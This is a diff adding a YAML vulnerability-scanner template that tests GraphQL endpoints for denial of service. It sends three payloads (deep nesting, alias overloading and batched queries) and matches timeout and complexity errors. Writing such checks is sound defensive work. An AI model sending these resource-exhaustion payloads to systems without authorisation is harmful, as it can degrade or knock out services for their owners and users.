@@ -1,0 +1,47 @@
+# templates/graphql/graphql-dos.yaml
+id: graphql-dos
+info:
+  name: GraphQL Denial of Service
+  author: shadowxp
+  severity: medium
+  description: Tests for GraphQL DoS vulnerabilities through deep nesting
+  tags:
+    - graphql
+    - dos
+    - resource-exhaustion
+
+vulnerability_type: graphql
+
+request:
+  - method: POST
+    path: "{{BaseURL}}"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "query": "{{graphql_payload}}"
+      }
+    
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+          - 503
+      - type: word
+        words:
+          - "timeout"
+          - "complexity"
+          - "depth"
+        part: body
+
+payloads:
+  # Deep nesting attack
+  - "query { user { posts { comments { replies { user { posts { comments { replies { user { name } } } } } } } } } }"
+  # Alias overloading
+  - "query { alias1: user(id: 1) { name } alias2: user(id: 2) { name } alias3: user(id: 3) { name } alias4: user(id: 4) { name } alias5: user(id: 5) { name } }"
+  # Batch query
+  - "[{\"query\": \"{ user(id: 1) { name } }\"}, {\"query\": \"{ user(id: 2) { name } }\"}, {\"query\": \"{ user(id: 3) { name } }\"}]"
+
+encoders:
+  - json_encode
